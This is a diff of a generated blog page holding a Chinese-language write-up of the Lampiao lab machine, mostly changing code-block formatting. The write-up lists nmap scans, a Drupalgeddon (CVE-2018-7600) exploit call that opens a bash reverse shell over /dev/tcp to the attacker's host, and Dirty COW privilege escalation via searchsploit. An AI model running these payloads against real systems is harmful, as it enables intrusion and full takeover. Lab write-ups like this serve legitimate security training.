@@ -16,7 +16,6 @@ sudo nmap --min-rate 10000 -p- 10.10.10.44 一共开放了三个 tcp 端口，�
 sudo nmap -sT -sC -sV -p22,80,1839 10.10.10.44 可以看到靶机开放 22 端口的 ssh 服务，一般 ssh 服务的渗透优先级靠后；80 端口是一个 http 服务，扫描出来的字符看上去并没有更多信息；1898 端口是一个 Apache 的 http 服务；使用 nmap 进行默认脚本扫描
 sudo nmap --script=vuln -p22,80,1898 10.10.10.44 没有扫描出来可以利用的漏洞信息
 Web 渗透 访问 80 端口，是一个字符串组成的图案，查看源码并没有发现更多信息
-访问 1898 端口发现有一个登入界面，尝试常见弱口令没有进去
 " />
 <meta name="keywords" content=", Hack, Writeup" />
 <meta name="robots" content="noodp" />
@@ -60,8 +59,7 @@ sudo nmap -sn 10.10.10.0/24 10.10.10.44 是新发现的主机，为靶机 IP；�
 sudo nmap --min-rate 10000 -p- 10.10.10.44 一共开放了三个 tcp 端口，使用 nmap 进行详细的端口扫描
 sudo nmap -sT -sC -sV -p22,80,1839 10.10.10.44 可以看到靶机开放 22 端口的 ssh 服务，一般 ssh 服务的渗透优先级靠后；80 端口是一个 http 服务，扫描出来的字符看上去并没有更多信息；1898 端口是一个 Apache 的 http 服务；使用 nmap 进行默认脚本扫描
 sudo nmap --script=vuln -p22,80,1898 10.10.10.44 没有扫描出来可以利用的漏洞信息
-Web 渗透 访问 80 端口，是一个字符串组成的图案，查看源码并没有发现更多信息
-访问 1898 端口发现有一个登入界面，尝试常见弱口令没有进去">
+Web 渗透 访问 80 端口，是一个字符串组成的图案，查看源码并没有发现更多信息">
   <meta itemprop="datePublished" content="2025-07-13T17:29:33+08:00">
   <meta itemprop="dateModified" content="2025-07-13T17:29:33+08:00">
   <meta itemprop="wordCount" content="143">
@@ -78,8 +76,7 @@ sudo nmap -sn 10.10.10.0/24 10.10.10.44 是新发现的主机，为靶机 IP；�
 sudo nmap --min-rate 10000 -p- 10.10.10.44 一共开放了三个 tcp 端口，使用 nmap 进行详细的端口扫描
 sudo nmap -sT -sC -sV -p22,80,1839 10.10.10.44 可以看到靶机开放 22 端口的 ssh 服务，一般 ssh 服务的渗透优先级靠后；80 端口是一个 http 服务，扫描出来的字符看上去并没有更多信息；1898 端口是一个 Apache 的 http 服务；使用 nmap 进行默认脚本扫描
 sudo nmap --script=vuln -p22,80,1898 10.10.10.44 没有扫描出来可以利用的漏洞信息
-Web 渗透 访问 80 端口，是一个字符串组成的图案，查看源码并没有发现更多信息
-访问 1898 端口发现有一个登入界面，尝试常见弱口令没有进去">
+Web 渗透 访问 80 端口，是一个字符串组成的图案，查看源码并没有发现更多信息">
 
 
 
@@ -190,17 +187,17 @@ Web 渗透 访问 80 端口，是一个字符串组成的图案，查看源码�
 <p>靶机ip：10.10.10.44</p>
 <h2 id="信息收集">信息收集</h2>
 <p>使用 nmap 进行主机发现</p>
-<pre tabindex="0"><code>sudo nmap -sn 10.10.10.0/24
-</code></pre><p><img src="content/posts/Lampiao%20Writeup/P1.png" alt="P1"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn 10.10.10.0/24
+</span></span></code></pre></div><p><img src="content/posts/Lampiao%20Writeup/P1.png" alt="P1"></p>
 <p>10.10.10.44 是新发现的主机，为靶机 IP；使用 nmap 以最低 10000 的速率进行全端口扫描</p>
-<pre tabindex="0"><code>sudo nmap --min-rate 10000 -p- 10.10.10.44
-</code></pre><p><img src="P2.png" alt="P2"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.10.10.44
+</span></span></code></pre></div><p><img src="P2.png" alt="P2"></p>
 <p>一共开放了三个 tcp 端口，使用 nmap 进行详细的端口扫描</p>
-<pre tabindex="0"><code>sudo nmap -sT -sC -sV -p22,80,1839 10.10.10.44
-</code></pre><p><img src="P6.png" alt="P6"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sT -sC -sV -p22,80,1839 10.10.10.44
+</span></span></code></pre></div><p><img src="P6.png" alt="P6"></p>
 <p>可以看到靶机开放 22 端口的 ssh 服务，一般 ssh 服务的渗透优先级靠后；80 端口是一个 http 服务，扫描出来的字符看上去并没有更多信息；1898 端口是一个 Apache 的 http 服务；使用 nmap 进行默认脚本扫描</p>
-<pre tabindex="0"><code>sudo nmap --script=vuln -p22,80,1898 10.10.10.44
-</code></pre><p><img src="P7.png" alt="P7"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap --script<span style="color:#f92672">=</span>vuln -p22,80,1898 10.10.10.44
+</span></span></code></pre></div><p><img src="P7.png" alt="P7"></p>
 <p>没有扫描出来可以利用的漏洞信息</p>
 <h2 id="web-渗透">Web 渗透</h2>
 <p>访问 80 端口，是一个字符串组成的图案，查看源码并没有发现更多信息</p>
@@ -213,20 +210,20 @@ Web 渗透 访问 80 端口，是一个字符串组成的图案，查看源码�
 <p><img src="P12.png" alt="P12"></p>
 <p><img src="P13.png" alt="P13"></p>
 <p>在 kali 本地建立一个监听，使用脚本连接到 kali</p>
-<pre tabindex="0"><code>sudo nc -lvnp 4444
-</code></pre><pre tabindex="0"><code>python3 drupa7-CVE-2018-7600.py http://10.10.10.44:1898/ -c &#39;bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34;&#39;
-</code></pre><p><img src="P14.png" alt="P14"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 drupa7-CVE-2018-7600.py http://10.10.10.44:1898/ -c <span style="color:#e6db74">&#39;bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34;&#39;</span>
+</span></span></code></pre></div><p><img src="P14.png" alt="P14"></p>
 <h2 id="linux-提权">Linux 提权</h2>
 <p>在 tmp 目录下下载 linpeas 进行自动化枚举</p>
-<pre tabindex="0"><code>chmod +x linpeas.sh
-</code></pre><pre tabindex="0"><code>./linpeas.sh
-</code></pre><p><img src="P17.png" alt="P17"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x linpeas.sh
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./linpeas.sh
+</span></span></code></pre></div><p><img src="P17.png" alt="P17"></p>
 <p>发现有 dirty cow 漏洞</p>
 <p><img src="P18.png" alt="P18"></p>
 <p>使用 searchsploit 搜索并下载 dirty cow 利用脚本</p>
-<pre tabindex="0"><code>searchsploit dirty cow
-</code></pre><pre tabindex="0"><code>searchsploit -m 40847
-</code></pre><p><img src="P20.png" alt="P20"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit dirty cow
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -m <span style="color:#ae81ff">40847</span>
+</span></span></code></pre></div><p><img src="P20.png" alt="P20"></p>
 <p>传进 kali 并利用</p>
 <p><img src="P19.png" alt="P19"></p>
 <p><img src="P15.png" alt="P15"></p>
